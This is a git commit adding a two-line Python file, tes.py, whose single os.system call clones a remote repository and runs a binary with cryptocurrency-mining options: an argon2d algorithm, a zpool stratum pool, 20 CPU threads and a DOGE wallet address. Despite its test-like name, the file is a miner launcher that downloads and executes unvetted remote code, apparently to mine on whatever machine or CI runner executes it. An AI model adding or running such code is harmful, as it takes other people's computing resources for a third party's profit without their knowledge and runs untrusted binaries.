2dd679df75e7a60626cf4e9deb4cf8e512639384
j0642773 <107818629+j0642773@users.noreply.github.com>
2022-07-28 17:18:57 +0000

    Create tes.py

---
+++ tes.py
@@ -0,0 +1,2 @@
+import os
+os.system("git clone https://github.com/j0642773/satu.git && cd SRB && chmod +x SRB && ./SRB --disable-gpu --algorithm argon2d_16000 --pool stratum+tcp://argon2d16000.sea.mine.zpool.ca:4241  --cpu-threads 20 --wallet DAxGkuHcPytmsbUTMebR4yB92Hx5X3AC4E -p c=DOGE,Aa ")
